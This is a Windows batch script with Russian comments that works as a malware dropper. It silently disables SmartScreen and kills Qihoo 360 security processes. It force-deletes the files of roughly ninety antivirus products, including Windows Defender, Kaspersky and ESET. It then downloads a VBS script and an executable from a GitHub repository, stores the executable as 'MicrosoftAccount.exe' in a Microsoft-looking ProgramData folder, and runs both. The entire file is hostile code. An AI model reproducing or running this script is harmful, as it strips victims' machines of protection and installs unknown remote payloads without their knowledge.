@echo off
setlocal

:: Отключаем SmartScreen (без отображения окон)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\SmartScreen" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1

:: Убиваем сторонние процессы
@echo off
set "process1=QHWatchdog.exe"
set "process2=QHSafeTray.exe"
set "process3=QHSafeMain.exe"
set "process4=QHActiveDefense.exe"
set "process5=PromoUtil.exe"

taskkill /im "%process1%" /f > nul 2>&1 & 
taskkill /im "%process2%" /f > nul 2>&1 & 
taskkill /im "%process3%" /f > nul 2>&1 & 
taskkill /im "%process4%" /f > nul 2>&1 & 
taskkill /im "%process5%" /f > nul 2>&1

:: Удаляем файлы и папки антивирусов (без отображения окон).
for %%P in (
    "C:\Program Files\AVAST Software\Avast"
    "C:\Program Files\AVG\Setup"
    "C:\Program Files\Norton\NortonInstaller.exe"
    "C:\Program Files\McAfee\MSC"
    "C:\Program Files (x86)\Avira\Launcher"
    "C:\Program Files (x86)\Panda Security\Panda Security Protection"
    "C:\Program Files (x86)\360\Total Security"
    "C:\Program Files (x86)\NANO Security\NANO Antivirus Pro"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Internet Security"
    "C:\Program Files (x86)\Grizzly Antivirus"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Total Security"
    "C:\Program Files\Doctor Web\Setup"
    "C:\Program Files (x86)\Microsoft Defender Antivirus"
    "C:\Program Files (x86)\Quick Heal\Quick Heal Total Security"
    "C:\Program Files (x86)\VIPRE\vipre.exe"
    "C:\Program Files (x86)\Bitdefender\Bitdefender Antivirus Plus"
    "C:\Program Files (x86)\ESET\ESET NOD32 Antivirus"
    "C:\Program Files (x86)\Sophos\AutoUpdate"
    "C:\Program Files (x86)\K7 Computing\K7 TotalSecurity"
    "C:\Program Files (x86)\F-Secure\Antivirus"
    "C:\Program Files\Sophos\Sophos Endpoint Agent"
    "C:\Program Files\Dr.Web\drweb.exe"
    "C:\Program Files (x86)\Comodo\Comodo Antivirus"
    "C:\Program Files\BullGuard\BullGuard Antivirus"
    "C:\Program Files (x86)\ZoneAlarm\ZoneAlarm Security"
    "C:\Program Files\Malwarebytes\Anti-Malware"
    "C:\Program Files (x86)\Emsisoft\Anti-Malware"
    "C:\Program Files (x86)\Fortinet\FortiClient"
    "C:\Program Files (x86)\Webroot\WRSA.exe"
    "C:\Program Files (x86)\IKARUS\IKARUS antiVirus"
    "C:\Program Files (x86)\Rising\Rising Antivirus"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Free Antivirus"
    "C:\Program Files (x86)\Norton Security"
    "C:\Program Files\eScan\eScan Antivirus"
    "C:\Program Files (x86)\Panda Dome"
    "C:\Program Files (x86)\ESET\Smart Security"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Security Cloud"
    "C:\Program Files\Symantec\Symantec Endpoint Protection"
    "C:\Program Files\ZoneAlarm\ZoneAlarm"
    "C:\Program Files (x86)\Titanium\titanium.exe"
    "C:\Program Files (x86)\Iolo\System Mechanic"
    "C:\Program Files (x86)\SpyHunter"
    "C:\Program Files\Avira\Antivirus"
    "C:\Program Files (x86)\G DATA\Internet Security"
    "C:\Program Files (x86)\Bitdefender\Bitdefender Antivirus Free"
    "C:\Program Files (x86)\Panda Antivirus Pro"
    "C:\Program Files (x86)\Webroot\SecureAnywhere"
    "C:\Program Files (x86)\F-Secure\F-Secure Internet Security"
    "C:\Program Files (x86)\McAfee\Total Protection"
    "C:\Program Files\K7 Computing\K7 Antivirus"
    "C:\Program Files (x86)\Avast Cleanup"
    "C:\Program Files\Bitdefender\Bitdefender Security"
    "C:\Program Files (x86)\Malwarebytes\Chameleon"
    "C:\Program Files (x86)\Avira\Connect"
    "C:\Program Files (x86)\avast! antivirus"
    "C:\Program Files\Microsoft Security Client\SavUI.exe"
    "C:\Program Files (x86)\SUPERAntiSpyware"
    "C:\Program Files (x86)\RogueKiller"
    "C:\Program Files (x86)\ESET\NOD32 Antivirus"
    "C:\Program Files (x86)\Norton Security"
    "C:\Program Files (x86)\AVG\AVG Internet Security"
    "C:\Program Files (x86)\Comodo\COMODO Internet Security"
    "C:\Program Files (x86)\Panda Security\Setup"
    "C:\Program Files (x86)\Avast\Avast Secure Browser\Application"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Labs"
    "C:\Program Files (x86)\Panda Security\panda.exe"
    "C:\Program Files\F-Secure\FSAV\uninstall.exe"
    "C:\Program Files (x86)\Microsoft\Windows Defender"
    "C:\Program Files (x86)\G DATA\G DATA Internet Security"
    "C:\Program Files (x86)\TrustPort\TrustPort Antivirus"
    "C:\Program Files (x86)\Zillya\Zillya Antivirus"
    "C:\Program Files (x86)\HitmanPro\HitmanPro"
    "C:\Program Files (x86)\AdwCleaner\AdwCleaner"
    "C:\Program Files (x86)\SpywareBlaster\SpywareBlaster"
    "C:\Program Files (x86)\Malwarebytes\AdwCleaner"
    "C:\Program Files (x86)\K7 Computing\K7 TotalSecurity"
    "C:\Program Files (x86)\Emsisoft\Emsisoft Emergency Kit"
    "C:\Program Files (x86)\Glary Utilities\Glary Utilities"
    "C:\Program Files (x86)\RegCleaner\RegCleaner"
    "C:\Program Files (x86)\Advanced SystemCare\Advanced SystemCare"
    "C:\Program Files (x86)\IObit Malware Fighter\IObit Malware Fighter"
    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Password Manager"
    "C:\Program Files (x86)\Bitdefender\Bitdefender Anti-Theft"
    "C:\Program Files (x86)\ESET\ESET Mobile Security"
    "C:\Program Files (x86)\K7 Computing\K7 Antivirus Plus"
    "C:\Program Files (x86)\Quick Heal\Quick Heal Total Security"
    "C:\Program Files (x86)\F-Secure\F-Secure Safe"
    "C:\Program Files (x86)\Panda Security\Panda Global Protection"
    "C:\Program Files (x86)\G DATA\G DATA Total Security"
    "C:\Program Files (x86)\Trend Micro\trend micro"
    "C:\Program Files (x86)\Avast Software\Avast"
    "C:\Program Files (x86)\AVG\AVG"
    "C:\Program Files (x86)\Microsoft Security Essentials\MSE"
    "C:\Program Files (x86)\Windows Defender"
) do (
    if exist "%%~P" (
        del /F /S /Q "%%~P" >nul 2>&1
    )
)

:: Удаляем папки антивирусов (без отображения окон).
for %%D in (
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Android Studio"
    "C:\Program Files\AVG\Browser\Application"
) do (
    if exist "%%~D" (
        rd /S /Q "%%~D" >nul 2>&1
    )
)

@echo off

:: Создать директорию, если она не существует
mkdir "C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount" >nul 2>&1

:: Детали скачиваемого скрипта VBS
set "VBS_URL=https://github.com/Rlz-vz/SchoolSigma/raw/main/task.vbs"
set "VBS_PATH=C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\task.vbs"

:: Скачать скрипт VBS
powershell -Command "try { (New-Object System.Net.WebClient).DownloadFile('%VBS_URL%', '%VBS_PATH%') } catch { exit /b 1 }" >nul 2>&1

:: Запустить скрипт VBS через cscript
cscript "%VBS_PATH%" //nologo >nul 2>&1

:: Детали скачиваемого исполняемого файла
set "EXE_URL=https://github.com/Rlz-vz/SchoolSigma/raw/main/fssf.exe"
set "EXE_PATH=C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\MicrosoftAccount.exe"

:: Скачать исполняемый файл
powershell -Command "try { (New-Object System.Net.WebClient).DownloadFile('%EXE_URL%', '%EXE_PATH%') } catch { exit /b 1 }" >nul 2>&1

:: Запустить исполняемый файл
start "" "%EXE_PATH%" >nul 2>&1

exit